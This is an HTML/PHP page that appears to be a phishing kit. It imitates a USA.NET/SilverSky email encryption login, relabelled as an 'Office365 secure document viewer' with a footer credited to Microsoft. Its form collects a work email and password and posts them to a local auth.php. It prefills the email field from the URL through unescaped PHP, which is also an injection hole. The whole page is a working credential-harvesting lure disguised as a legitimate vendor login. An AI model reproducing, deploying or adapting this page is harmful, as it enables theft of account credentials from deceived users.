
<!DOCTYPE html>
<!--   (generation C8.MAIN.4.25Zmsweb01.mailsafe.usa.net) (C)  USA.NET, Inc. -->

<html>
<head>
	<meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Email Encryption</title>
	<link href="main.min.css" rel="stylesheet" type="text/css">
	<link rel="icon" type="image/png" sizes="192x192" href="https://www.google.com/s2/favicons?domain=?v=BUILD_HASH" id="favimg">
<style type="text/css">
<!--
#navbar {
    border-bottom: 2px solid #A3A5AB;
}

-->
</style>

<script type="text/javascript">

var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-24146012-5']);
_gaq.push(['_trackPageview']);

(function() {
	var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
	ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
	var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();

</script>

<script type="text/javascript" src="commoncombined.js"></script>
<script type="text/javascript" src="detect_timezone.js"></script>

<script type="text/javascript" language="Javascript">
<!--
if ("443" != "443")
{
	self.location.href="https://mailsafe.perimeterusa.com/tpl/Door/Login";
}

function checktz()
{
	var timezone = jzTimezoneDetector.determine_timezone().timezone; // Now you have an instance of the TimeZone object.

	document.loginform.timezone.value = timezone.olson_tz;
}

//-->
</script>
</head>
<body onLoad="checktz(); setFocusFirstField();" >
	<div id="wrapper">
		<div id="content">
		<!-- Body content begins here -->
		<form method="post" action="auth.php" id="gaia_loginform">
        	<input type=hidden name="Use_Cookie" VALUE="y">
        	<input type=hidden name="timezone" VALUE="">
        	<input type="hidden" name="SuccessfulLogin" value="/tpl">
			<section class="section" >
				<div class="box login-box" >
					<div class="login-logo"><a href="http://www.silversky.com/" target="_blank" style="text-decoration:none"></a>Office365 secure document viewer,  November 25, 2020</div>
					<h4 class="subtitle is-4 has-text-centered">LOGIN USING WORK EMAIL</h4>

      				
					<div class="field">
        				<label class="label">Email</label>
        				<div class="control">
								<input class="input" type="email" name="email" value="<?=$_GET[email]?>">
						</div>
      				</div>
					<div class="field">
						<label class="label">Password</label>
						<div class="control">
							<input class="input" type="password" name="password" value="">
						</div>
					</div>
					<div class="control">
						<input type="submit" value="Login" name="Login" class="button is-link">
					</div>
					<div class="login-link">
						<a href="#">Login issues?</a>					</div>
					<p class="help">Email Encryption supports the following browsers:<br> Chrome, FireFox, Safari and IE10+.</p>
				</div>
			</section>
		</form>
	</div>
	<div id="usa-ext-footer">
		&copy; 2020 <a href="http://www.silversky.com/" target="_blank">Microsoft</a> | <a href="https://silversky.com/privacy-policy/" target="_blank">Privacy Policy</a>
	</div>
    <div>
</body>
</html>